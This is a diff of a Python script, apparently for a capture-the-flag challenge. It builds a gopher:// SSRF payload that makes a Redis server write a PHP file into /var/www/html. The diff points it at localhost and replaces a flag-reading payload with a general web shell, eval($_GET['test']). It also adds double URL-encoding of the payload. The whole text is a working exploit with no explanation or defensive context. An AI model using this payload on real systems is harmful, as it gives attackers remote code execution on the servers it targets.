@@ -1,8 +1,8 @@
 import urllib.parse
 protocol="gopher://"
-ip="10.69.29.11"      #运行有redis的主机ip
+ip="127.0.0.1"      #运行有redis的主机ip
 port="6379"
-shell="\n\n<?php system(\"cat /flag\");?>\n\n"
+shell="\n\n<?php eval($_GET[\"test\"]);?>\n\n"
 filename="shell.php"
 path="/var/www/html"
 passwd=""
@@ -29,3 +29,4 @@ if __name__=="__main__":
 	for x in cmd:
 		payload += urllib.parse.quote(redis_format(x))
 	print(payload)
+	print(urllib.parse.quote(payload))
